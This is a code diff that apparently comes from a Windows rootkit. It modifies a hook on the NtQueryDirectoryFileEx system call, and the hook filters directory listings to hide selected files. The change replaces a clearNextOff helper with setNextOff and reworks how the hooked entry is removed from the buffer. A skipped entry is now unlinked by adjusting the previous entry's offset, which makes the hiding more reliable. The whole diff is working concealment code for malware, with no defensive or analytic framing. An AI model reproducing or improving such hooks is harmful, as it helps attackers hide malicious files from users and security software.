@@ -77,34 +77,34 @@ static ULONG getNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
 			return 0;
 	}
 }
-static void clearNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
+static void setNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass, ULONG value) {
 	switch (fileInfoClass) {
 		case FileDirectoryInformation:
-			((PFILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileFullDirectoryInformation:
-			((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileBothDirectoryInformation:
-			((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileNamesInformation:
-			((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileIdBothDirectoryInformation:
-			((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileIdFullDirectoryInformation:
-			((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileIdGlobalTxDirectoryInformation:
-			((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileIdExtdDirectoryInformation:
-			((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		case FileIdExtdBothDirectoryInformation:
-			((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = value;
 			break;
 		default:
 			break;
@@ -159,10 +159,16 @@ NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
 						//copy rest of the buffer over our entry
 						//    where?             what?                                    how much?
 						//     here              next                     current length - before our entry - our entry
-						memcpy(curr, ((uint8_t*)curr) + nextOff, Length - (((uint32_t)curr) - ((uint32_t)FileInformation)) - nextOff);
+						//memcpy(curr, ((uint8_t*)curr) + nextOff, Length - (((uint32_t)curr) - ((uint32_t)FileInformation)) - nextOff);
+						if (prev) {
+							setNextOff(prev, FileInformationClass, getNextOff(prev, FileInformationClass) + nextOff);
+						} else {
+							//copy over our entry
+							memcpy(curr, ((uint8_t*)curr) + nextOff, Length - nextOff);
+						}
 					} else {
 						if (prev) {
-							clearNextOff(prev, FileInformationClass);
+							setNextOff(prev, FileInformationClass, 0);
 						} else {
 							status = STATUS_NO_MORE_FILES;
 						}
